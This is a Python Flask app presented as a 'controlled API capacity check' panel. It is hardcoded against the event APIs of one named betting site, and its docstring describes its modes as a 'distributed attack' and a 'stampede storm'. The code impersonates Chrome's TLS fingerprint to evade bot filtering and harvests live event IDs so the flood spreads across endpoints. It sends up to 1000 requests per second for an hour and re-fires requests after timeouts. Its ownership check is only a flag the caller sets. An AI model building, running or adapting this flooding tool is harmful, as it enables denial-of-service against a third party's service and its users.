"""Browser-based control panel for controlled API capacity checks.
High-Performance Async Engine powered by curl_cffi (Chrome TLS fingerprinting) + AsyncIO.
Supports multi-scenario simulations:
1. Main Events Polling (/api/main-events)
2. All Live Matches distributed attack (/api/event)
3. Cascading Abort / Stampede storm simulation
"""

from __future__ import annotations

import asyncio
import json
import os
import platform
import random
import statistics
import threading
import time
from collections import Counter, deque
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession
from flask import Flask, Response, jsonify, render_template, request

try:
    import psutil
except ImportError:
    psutil = None


MAX_RPS = 1000
MAX_DURATION = 3600
MAX_THREADS = 100
DEFAULT_URL = "https://www.7xwon.com/api/main-events"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
)

DEFAULT_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.7xwon.com",
    "Referer": "https://www.7xwon.com/",
    "User-Agent": USER_AGENT,
}

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 32 * 1024

ACTIVE_RUNS: dict[str, "RunState"] = {}
ACTIVE_RUNS_LOCK = threading.Lock()


class RunState:
    """Live, thread-safe counters for one in-flight run, read by /api/stream."""

    def __init__(self, total):
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.total = total
        self.done = 0
        self.ok = 0
        self.failed = 0
        self.bytes = 0
        self.statuses = Counter()
        self.latencies = []
        self.recent = deque(maxlen=60)
        self.recent_times = deque(maxlen=100)
        self.started_at = time.time()
        self.finished = False

    def record(self, status, latency_ms, size_bytes, error):
        now = time.time()
        with self.lock:
            self.done += 1
            if status is not None and 200 <= status < 400:
                self.ok += 1
            else:
                self.failed += 1
            self.bytes += size_bytes
            key = str(status) if status is not None else "ERR"
            self.statuses[key] += 1
            self.latencies.append(latency_ms)
            self.recent.append(round(latency_ms, 1))
            self.recent_times.append(now)

    def snapshot(self):
        with self.lock:
            lat = sorted(self.latencies)
            count = len(lat)
            pct = lambda p: round(lat[int((count - 1) * p / 100)], 1) if count else 0

            now = time.time()
            cutoff = now - 1.0
            recent_count = sum(1 for t in self.recent_times if t >= cutoff)

            elapsed = max(now - self.started_at, 0.001)
            achieved = round(recent_count if self.done > 5 else (self.done / elapsed), 1)

            return {
                "done": self.done,
                "total": self.total,
                "ok": self.ok,
                "failed": self.failed,
                "achieved_rps": achieved,
                "avg_ms": round(sum(lat) / count, 1) if count else 0,
                "p95_ms": pct(95),
                "p99_ms": pct(99),
                "total_mib": round(self.bytes / 1024**2, 3),
                "statuses": dict(self.statuses),
                "recent": list(self.recent),
                "elapsed": round(elapsed, 1),
                "finished": self.finished,
                "stopped": self.stop_event.is_set(),
            }


def system_profile():
    cores = os.cpu_count() or 2
    memory_gib = None
    if psutil is not None:
        memory_gib = round(psutil.virtual_memory().total / 1024**3, 1)

    threads = min(MAX_THREADS, max(10, cores * 5))
    rps = min(MAX_RPS, max(50, cores * 25))
    return {
        "os": f"{platform.system()} {platform.release()}",
        "cores": cores,
        "memory_gib": memory_gib,
        "suggested": {"rps": rps, "threads": threads, "duration": 30, "timeout": 5},
    }


def validate_config(data):
    url = str(data.get("url", "")).strip()
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise ValueError("Gecerli bir http:// veya https:// URL gir.")

    method = str(data.get("method", "GET")).upper()
    if method not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
        raise ValueError("Gecersiz HTTP metodu.")

    try:
        rps = int(data.get("rps", 1))
        duration = int(data.get("duration", 10))
        threads = int(data.get("threads", 1))
        timeout = float(data.get("timeout", 10))
    except (TypeError, ValueError) as exc:
        raise ValueError("RPS, sure, thread ve timeout sayi olmali.") from exc

    if not 1 <= rps <= MAX_RPS:
        raise ValueError(f"RPS 1-{MAX_RPS} arasinda olmali.")
    if not 1 <= duration <= MAX_DURATION:
        raise ValueError(f"Sure 1-{MAX_DURATION} saniye arasinda olmali.")
    if not 1 <= threads <= MAX_THREADS:
        raise ValueError(f"Thread 1-{MAX_THREADS} arasinda olmali.")
    if not 1 <= timeout <= 30:
        raise ValueError("Timeout 1-30 saniye arasinda olmali.")

    body = None
    if method in {"POST", "PUT", "PATCH"}:
        body = data.get("body") or None
        if body is not None and not isinstance(body, (dict, list)):
            raise ValueError("JSON body nesne veya dizi olmali.")
    return url, method, rps, duration, threads, timeout, body


async def fetch_live_event_ids(session: AsyncSession, headers: dict):
    """Fetches currently active match event IDs from /api/main-events with Chrome TLS fingerprint."""
    try:
        url = "https://www.7xwon.com/api/main-events"
        payload = {"type": 0, "odds": 0, "code": False, "s": 1, "t": False}
        resp = await session.post(url, json=payload, headers=headers, impersonate="chrome120", timeout=5.0)
        if resp.status_code == 200:
            data = resp.json()
            items = []
            if isinstance(data, dict):
                items = data.get("data") or data.get("events") or []
                if isinstance(items, dict):
                    items = list(items.values())
            elif isinstance(data, list):
                items = data
            ids = []
            for item in items:
                if isinstance(item, dict):
                    eid = item.get("id") or item.get("eventid") or item.get("eventId")
                    if eid:
                        ids.append(int(eid))
            if ids:
                return ids
    except Exception:
        pass
    return [36245965, 36246068, 36269546]


async def _async_worker(session: AsyncSession, method: str, url: str, headers: dict, body: dict | None, timeout: float, sem: asyncio.Semaphore, state: RunState, results: list, is_cascading: bool = False):
    if state.stop_event.is_set():
        return
    async with sem:
        if state.stop_event.is_set():
            return
        started = time.perf_counter()
        status = None
        size = 0
        error_msg = None
        try:
            kwargs = {"headers": headers, "timeout": timeout, "impersonate": "chrome120"}
            if body is not None and method in {"POST", "PUT", "PATCH"}:
                kwargs["json"] = body

            if method == "POST":
                resp = await session.post(url, **kwargs)
            elif method == "GET":
                resp = await session.get(url, **kwargs)
            elif method == "PUT":
                resp = await session.put(url, **kwargs)
            elif method == "DELETE":
                resp = await session.delete(url, **kwargs)
            else:
                resp = await session.request(method, url, **kwargs)

            status = resp.status_code
            raw = resp.content
            size = len(raw) if raw else 0
            if status >= 400:
                error_msg = f"HTTP {status}"
        except asyncio.TimeoutError:
            error_msg = f"Timeout ({timeout:.1f}s) -> Stampede Abort" if is_cascading else f"Read timed out ({timeout}s)"
            if is_cascading and not state.stop_event.is_set():
                asyncio.create_task(_async_worker(session, method, url, headers, body, timeout, sem, state, results, False))
        except Exception as exc:
            error_msg = str(exc)

        elapsed = (time.perf_counter() - started) * 1000
        res = (status, elapsed, size, error_msg)
        results.append(res)
        state.record(*res)


async def _async_run_check(url, method, rps, duration, concurrency, timeout, token, body, state, scenarios, user_agent=None, cookie=None):
    headers = dict(DEFAULT_HEADERS)
    if user_agent and user_agent.strip():
        headers["User-Agent"] = user_agent.strip()
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if cookie and cookie.strip():
        headers["Cookie"] = cookie.strip()

    sc_main = scenarios.get("main", True)
    sc_all_matches = scenarios.get("all_matches", False)
    sc_cascading = scenarios.get("cascading", False)

    effective_timeout = 2.5 if sc_cascading else timeout
    sem = asyncio.Semaphore(concurrency)
    results = []
    total_requests = rps * duration
    interval = 1.0 / rps if rps > 0 else 0
    start_time = time.perf_counter()
    tasks = []

    async with AsyncSession() as session:
        event_ids = []
        if sc_all_matches:
            event_ids = await fetch_live_event_ids(session, headers)

        for index in range(total_requests):
            if state.stop_event.is_set():
                break
            now = time.perf_counter()
            if (now - start_time) >= duration:
                break

            due = start_time + (index * interval)
            pause = due - now
            if pause > 0:
                await asyncio.sleep(pause)

            req_url = url
            req_body = body
            req_method = method

            if sc_main and sc_all_matches:
                if index % 2 == 0:
                    req_url = "https://www.7xwon.com/api/main-events"
                    req_method = "POST"
                    req_body = body or {"type": 0, "odds": 1, "code": False, "s": 1, "t": False}
                else:
                    req_url = "https://www.7xwon.com/api/event"
                    req_method = "POST"
                    eid = random.choice(event_ids) if event_ids else 36245965
                    req_body = {"id": eid}
            elif sc_all_matches:
                req_url = "https://www.7xwon.com/api/event"
                req_method = "POST"
                eid = random.choice(event_ids) if event_ids else 36245965
                req_body = {"id": eid}
            elif sc_main:
                req_url = "https://www.7xwon.com/api/main-events"
                req_method = "POST"
                req_body = body or {"type": 0, "odds": 1, "code": False, "s": 1, "t": False}

            task = asyncio.create_task(
                _async_worker(session, req_method, req_url, headers, req_body, effective_timeout, sem, state, results, sc_cascading)
            )
            tasks.append(task)

            if len(tasks) > 800:
                tasks = [t for t in tasks if not t.done()]

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = max(time.perf_counter() - start_time, 1e-9)
    stopped = state.stop_event.is_set()

    if not results:
        return {
            "requests": 0, "successful": 0, "failed": 0, "achieved_rps": 0,
            "avg_ms": 0, "p95_ms": 0, "p99_ms": 0, "response_bytes_avg": 0,
            "total_mib": 0, "mib_per_second": 0, "statuses": {},
            "error_sample": None, "stopped": stopped,
        }

    latencies = sorted(item[1] for item in results)
    statuses = {}
    for status, _, _, _ in results:
        key = str(status) if status is not None else "ERR"
        statuses[key] = statuses.get(key, 0) + 1

    successful = sum(200 <= status < 400 for status, _, _, _ in results if status is not None)
    bytes_received = sum(item[2] for item in results)
    errors = [item[3] for item in results if item[3]]
    percentile = lambda percent: latencies[round((len(latencies) - 1) * percent / 100)]

    return {
        "requests": len(results),
        "successful": successful,
        "failed": len(results) - successful,
        "achieved_rps": round(len(results) / elapsed, 2),
        "avg_ms": round(statistics.mean(latencies), 1),
        "p95_ms": round(percentile(95), 1),
        "p99_ms": round(percentile(99), 1),
        "response_bytes_avg": round(statistics.mean(item[2] for item in results), 1),
        "total_mib": round(bytes_received / 1024**2, 3),
        "mib_per_second": round(bytes_received / elapsed / 1024**2, 3),
        "statuses": statuses,
        "error_sample": errors[0][:220] if errors else None,
        "stopped": stopped,
    }


def run_check(url, method, rps, duration, threads, timeout, token, body, state, scenarios, user_agent=None, cookie=None):
    return asyncio.run(_async_run_check(url, method, rps, duration, threads, timeout, token, body, state, scenarios, user_agent, cookie))


@app.get("/")
def index():
    return render_template("index.html", default_url=DEFAULT_URL, profile=system_profile())


@app.get("/api/system")
def system():
    return jsonify(system_profile())


@app.post("/api/run")
def run():
    data = request.get_json(silent=True) or {}
    try:
        url, method, rps, duration, threads, timeout, body = validate_config(data)
    except ValueError as exc:
        return jsonify({"error": str(exc)}), 400

    if data.get("confirm") is not True:
        return jsonify({"error": "Test sahipligi onayi gerekli."}), 400

    scenarios = data.get("scenarios") or {
        "main": True,
        "all_matches": True,
        "cascading": False
    }

    run_id = str(data.get("run_id", "")).strip()
    state = RunState(rps * duration)
    if run_id:
        with ACTIVE_RUNS_LOCK:
            ACTIVE_RUNS[run_id] = state
    try:
        result = run_check(
            url, method, rps, duration, threads, timeout,
            str(data.get("token", "")).strip(), body, state, scenarios,
            user_agent=str(data.get("user_agent", "")).strip(),
            cookie=str(data.get("cookie", "")).strip()
        )
    finally:
        with state.lock:
            state.finished = True
        if run_id:
            with ACTIVE_RUNS_LOCK:
                ACTIVE_RUNS.pop(run_id, None)
    return jsonify(result)


@app.post("/api/stop")
def stop():
    data = request.get_json(silent=True) or {}
    run_id = str(data.get("run_id", "")).strip()
    with ACTIVE_RUNS_LOCK:
        state = ACTIVE_RUNS.get(run_id)
    if state is None:
        return jsonify({"stopped": False, "error": "Aktif test bulunamadi."}), 404
    state.stop_event.set()
    return jsonify({"stopped": True})


@app.get("/api/stream")
def stream():
    run_id = request.args.get("run_id", "").strip()

    def gen():
        state = None
        for _ in range(60):
            with ACTIVE_RUNS_LOCK:
                state = ACTIVE_RUNS.get(run_id)
            if state is not None:
                break
            time.sleep(0.05)
        if state is None:
            yield "event: end\ndata: {}\n\n"
            return
        while True:
            snapshot = state.snapshot()
            yield f"data: {json.dumps(snapshot)}\n\n"
            if snapshot["finished"]:
                break
            time.sleep(0.25)
        yield "event: end\ndata: {}\n\n"

    return Response(
        gen(),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "8080")), debug=False, threaded=True)
